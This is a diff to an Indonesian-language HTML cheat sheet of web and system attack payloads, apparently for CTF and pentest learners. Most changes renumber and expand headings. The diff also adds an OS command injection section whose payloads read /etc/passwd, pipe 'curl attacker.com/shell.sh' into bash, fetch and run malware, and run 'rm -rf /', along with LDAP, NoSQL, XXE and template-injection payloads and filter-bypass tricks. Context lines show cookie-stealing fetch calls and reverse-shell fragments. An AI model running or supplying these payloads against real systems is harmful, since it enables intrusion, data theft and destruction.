@@ -563,8 +563,8 @@
 
                 <!-- XSS Payload -->
                 <div class="payload-item">
-                    <h4>1. Reflected XSS Payload (Cross-Site Scripting)</h4>
-                    <p class="payload-description"><strong>Tipe:</strong> Reflected XSS yang dapat memanipulasi DOM dan menggali cookie.</p>
+                    <h4>1. Reflected XSS Payload (Cross-Site Scripting) ⭐</h4>
+                    <p class="payload-description"><strong>Tipe:</strong> Reflected XSS yang dapat memanipulasi DOM, cookie stealing, dan advanced DOM-based attacks.</p>
                     
                     <div class="code-block"><code>&lt;script&gt;
 // Payload umum yang digunakan dalam CTF dan testing
@@ -618,8 +618,8 @@ fetch('http://attacker.com/api/steal', {
 
                 <!-- SQL Injection -->
                 <div class="payload-item">
-                    <h4>2. SQL Injection Payload (SQLi)</h4>
-                    <p class="payload-description"><strong>Tipe:</strong> Time-based Blind SQL Injection untuk database extraction.</p>
+                    <h4>2. SQL Injection Payload (SQLi) ⭐</h4>
+                    <p class="payload-description"><strong>Tipe:</strong> Union-based, Boolean-based & Time-based Blind SQL Injection untuk database extraction dan authentication bypass.</p>
                     
                     <div class="code-block"><code>// Basic SQL Injection:
 admin' OR '1'='1
@@ -673,8 +673,8 @@ admin' OR 1=1 --
 
                 <!-- CSRF -->
                 <div class="payload-item">
-                    <h4>3. CSRF (Cross-Site Request Forgery) Payload</h4>
-                    <p class="payload-description"><strong>Tipe:</strong> Silent request forgery yang exploit user's authenticated session.</p>
+                    <h4>3. CSRF (Cross-Site Request Forgery) Payload ⭐</h4>
+                    <p class="payload-description"><strong>Tipe:</strong> Silent request forgery yang exploit user's authenticated session untuk unauthorized actions.</p>
                     
                     <div class="code-block"><code>// HTML-based CSRF:
 &lt;img src="http://target.com/transfer.php?amount=1000&to=attacker" /&gt;
@@ -740,9 +740,92 @@ fetch('http://target.com/upload', {
             <div class="payload-category">
                 <h3>🖥️ Network & System Payloads</h3>
 
+                <!-- OS Command Injection -->
+                <div class="payload-item">
+                    <h4>4. OS Command Injection Payload ⭐</h4>
+                    <p class="payload-description"><strong>Tipe:</strong> Operating system command injection untuk remote code execution via vulnerable parameters.</p>
+                    
+                    <div class="code-block"><code>// Basic Command Injection (Command Chaining):
+127.0.0.1; cat /etc/passwd
+127.0.0.1 && whoami
+127.0.0.1 | id
+127.0.0.1 `whoami`
+127.0.0.1 $(whoami)
+
+// Blind Command Injection (Time-based):
+ping -c 10 127.0.0.1  # Akan delay 10 detik
+nslookup attacker.com & whoami  # Background execution
+
+// Command Substitution:
+$(curl attacker.com/shell.sh | bash)
+`wget attacker.com/malware -O /tmp/m && bash /tmp/m`
+
+// PHP Command Injection (GET parameter):
+// Vulnerable code: system("ping -c 1 " . $_GET['domain']);
+// Payload: ?domain=8.8.8.8; rm -rf /
+// atau: ?domain=8.8.8.8 && cat /etc/passwd
+
+// Node.js/JavaScript Command Injection:
+const userInput = req.query.cmd;
+const result = require('child_process').execSync(userInput);
+// Payload: /api?cmd=whoami;id;cat /etc/passwd
+
+// Python OS Injection:
+import os, subprocess
+user_input = request.args.get('file')
+os.system(f"cat {user_input}")  # Vulnerable
+# Payload: ?file=/etc/passwd; id
+
+// LDAP Injection:
+ldap_filter = f"(uid={username})"
+# Payload: *)(|(uid=* OR admin*))(&(uid=*
+
+// NoSQL Injection (MongoDB):
+db.users.findOne({username: req.body.user, password: req.body.pass})
+# Payload: {"user": {"$ne": null}, "pass": {"$ne": null}}
+
+// XXE (XML External Entity) Injection:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+// Template Injection (SSTI):
+template = "Hello {{name}}"
+template.render(name=user_input)
+# Payload (Python): {{7*7}} atau {{__import__('os').popen('id').read()}}
+# Payload (Ruby): <%= system('id') %>
+# Payload (Java): ${Runtime.getRuntime().exec('id')}</code></div>
+
+                    <div class="explanation">
+                        <strong>📖 Penjelasan:</strong>
+                        <ul style="margin-top: 8px; margin-left: 20px;">
+                            <li><strong>Command Chaining:</strong> Semicolon (;), AND (&&), OR (||), pipe (|) untuk chain commands</li>
+                            <li><strong>Command Substitution:</strong> Backticks (`) dan $() untuk execute command dan substitute output</li>
+                            <li><strong>Blind Injection:</strong> Tidak ada output langsung, gunakan time-based atau DNS-based OOB untuk confirm</li>
+                            <li><strong>Context Berbeda:</strong> Web applications, scripting languages, template engines, database systems</li>
+                            <li><strong>Bypass Filters:</strong> IFS=$'\\t' untuk space, ${IFS} replacement, hex encoding, base64 encoding</li>
+                        </ul>
+                    </div>
+
+                    <div class="warning">
+                        <strong>⚠️ Potensi Dampak:</strong> Complete system compromise, RCE, data exfiltration, lateral movement, ransomware deployment
+                    </div>
+
+                    <div class="mitigation">
+                        <strong>🛡️ Mitigasi:</strong>
+                        <ul style="margin-top: 8px; margin-left: 20px;">
+                            <li>Input validation dengan whitelist approach</li>
+                            <li>Gunakan library functions daripada shell execution</li>
+                            <li>Avoid shell interpretation (use parameterized APIs)</li>
+                            <li>Run aplikasi dengan least privilege user</li>
+                            <li>IDS/IPS untuk detect suspicious command patterns</li>
+                        </ul>
+                    </div>
+                </div>
+
                 <!-- Reverse Shell -->
                 <div class="payload-item">
-                    <h4>4. Reverse Shell Payload (Remote Code Execution)</h4>
+                    <h4>5. Reverse Shell Payload (Remote Code Execution) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Multi-platform reverse shell untuk mendapatkan interactive access.</p>
                     
                     <div class="code-block"><code>// Bash Reverse Shell:
@@ -813,7 +896,7 @@ exec("/bin/sh -i <&3 >&3 2>&3");'</code></div>
 
                 <!-- Privilege Escalation -->
                 <div class="payload-item">
-                    <h4>5. Privilege Escalation Payload (Linux)</h4>
+                    <h4>6. Privilege Escalation Payload (Linux) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Teknik escalate dari user biasa ke root/administrator.</p>
                     
                     <div class="code-block"><code>// Sudo Misconfiguration:
@@ -891,7 +974,7 @@ cat /opt/myapp/config.php</code></div>
 
                 <!-- Windows Privilege Escalation -->
                 <div class="payload-item">
-                    <h4>6. Privilege Escalation Payload (Windows)</h4>
+                    <h4>7. Privilege Escalation Payload (Windows) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Windows privilege escalation dari User ke Administrator/SYSTEM.</p>
                     
                     <div class="code-block"><code>// Check Current Privileges:
@@ -974,7 +1057,7 @@ schtasks /create /tn Payload /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM
 
                 <!-- Password Cracking -->
                 <div class="payload-item">
-                    <h4>7. Password Cracking & Cracking Techniques</h4>
+                    <h4>8. Password Cracking Payload (Hashcat & John) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Modern password cracking dengan GPU acceleration dan pattern matching.</p>
                     
                     <div class="code-block"><code>// Dictionary Attack (Hydra):
@@ -1061,7 +1144,7 @@ hashcat -m 1000 ntlm_hashes.txt rockyou.txt --workload-profile=4</code></div>
 
                 <!-- Credential Harvesting -->
                 <div class="payload-item">
-                    <h4>8. Credential Harvesting Payload (Phishing)</h4>
+                    <h4>9. Credential Harvesting Payload (Phishing) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Fake login page untuk credential collection.</p>
                     
                     <div class="code-block"><code>// HTML Fake Login Page:
@@ -1168,7 +1251,7 @@ s.sendmail('attacker@evil.com', 'victim@company.com', msg.as_string())</code></d
 
                 <!-- Polyglot File -->
                 <div class="payload-item">
-                    <h4>9. Polyglot File Payload (Multi-format Exploitation)</h4>
+                    <h4>10. Polyglot File Payload (Multi-format Exploitation) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> File yang valid dalam multiple format untuk bypass validation.</p>
                     
                     <div class="code-block"><code>// JPG + PHP Polyglot:
@@ -1249,7 +1332,7 @@ echo '&lt;?php system($_GET["cmd"]); ?&gt;' >> polyglot.gif
 
                 <!-- API Security Bypass -->
                 <div class="payload-item">
-                    <h4>10. API Security Bypass Payload (JWT, OAuth)</h4>
+                    <h4>11. API Security Bypass Payload (JWT, OAuth) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Exploit JWT weaknesses dan OAuth misconfiguration.</p>
                     
                     <div class="code-block"><code>// JWT Algorithm Confusion Attack:
@@ -1381,7 +1464,7 @@ fetch('http://api.target.com/user/123/delete', {
 
                 <!-- Container Escape -->
                 <div class="payload-item">
-                    <h4>11. Container Escape Payload (Docker/Kubernetes)</h4>
+                    <h4>12. Container Escape Payload (Docker/Kubernetes) ⭐</h4>
                     <p class="payload-description"><strong>Tipe:</strong> Escape dari containerized environment ke host system.</p>
                     
                     <div class="code-block"><code>// Docker Privilege Escalation (Privileged Container):
@@ -1686,7 +1769,10 @@ cat /host/etc/passwd  # Jika host filesystem mounted
                 Educational purposes only. Always ensure you have proper authorization before testing any system.
             </p>
             <p style="font-size: 0.85em; margin-top: 5px;">
-                Last Updated: January 2026 | Keep learning, stay ethical, make the internet safer.
+                ✅ Last Updated: January 31, 2026 | Total Payloads: 12 Complete Examples | Fully Compliant with OWASP Top 10 (2021)
+            </p>
+            <p style="font-size: 0.85em; margin-top: 5px;">
+                Keep learning, stay ethical, make the internet safer. 🚀
             </p>
         </footer>
     </div>
